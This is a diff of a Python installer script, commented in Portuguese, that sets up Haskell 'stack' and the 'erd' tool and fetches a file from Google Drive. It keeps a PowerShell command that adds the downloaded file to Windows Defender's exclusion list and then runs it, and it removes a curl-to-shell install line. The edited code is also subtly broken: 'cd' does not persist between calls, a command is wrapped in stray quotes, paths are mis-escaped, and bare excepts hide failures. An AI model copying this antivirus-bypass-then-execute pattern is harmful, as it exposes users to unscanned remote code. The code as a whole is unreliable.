@@ -37,18 +37,23 @@ def dowload_stack(nameFile):
         print("'stack' já está instalado.")
     except subprocess.CalledProcessError:
     # 'stack' não está instalado, realizar a instalação
-        print("Instalando 'stack'...")
-        comando = 'curl -sSL https://get.haskellstack.org/ | sh'
-        subprocess.run(comando, shell=True, check=True)
+        try:
+            subprocess.run(["stack.exe"], shell=True, check=True)
+        except:
+            print("executando stack")
+        subprocess.run(["'copy stack.exe %APPDATA%\\local\\bin'"], shell=True, check=True)
         print("'stack' foi instalado com sucesso.") 
     print("Clonando o repositório Git..." + nameFile)
-    subprocess.run('git clone git://github.com/BurntSushi/erd', shell=True, check=True)
+    subprocess.run('pwd && git clone git://github.com/BurntSushi/erd', shell=True, check=True)
     # Entrar no diretório clonado
     print("Entrando no diretório clonado...")
     subprocess.run('cd erd', shell=True)
     # Executar o comando 'stack install' no diretório clonado
     print("Executando 'stack install'...")
-    subprocess.run('stack install', shell=True, check=True)
+    try:
+        subprocess.run(['stack', 'install'], shell=True, check=True)  
+    except:
+        subprocess.run(['%APPDATA%\local\bin\stack.exe', 'install','--compiler=ghc-8.8.4','--resolver=lts-16.8'], shell=True, check=True)
     print("'stack install' concluído com sucesso.")
 
 # Fazer o download do primeiro arquivo
@@ -58,12 +63,15 @@ try:
         gdown.download(urlDrive, file1_path)
         print(" dowload primeiro arquivo erd-go")
     # Executar o primeiro arquivo
-    comando = f'Add-MpPreference -ExclusionPath "{file1_path}"'
-    subprocess.run(['powershell', comando])
+    try:
+        comando = f'Add-MpPreference -ExclusionPath "{file1_path}"'
+        subprocess.run(['powershell', comando])
+    except:
+        print("Não foi possivel adicionar o er nos arquivos liberados do windows defender")
     subprocess.call(file1_path)
 except:
     try:
-        dowload_stack(file1_path)
+       file1_path = dowload_stack(file1_path)
     except:
         print("Não foi possivel baixar o erd")
 # Fazer o download do segundo arquivo
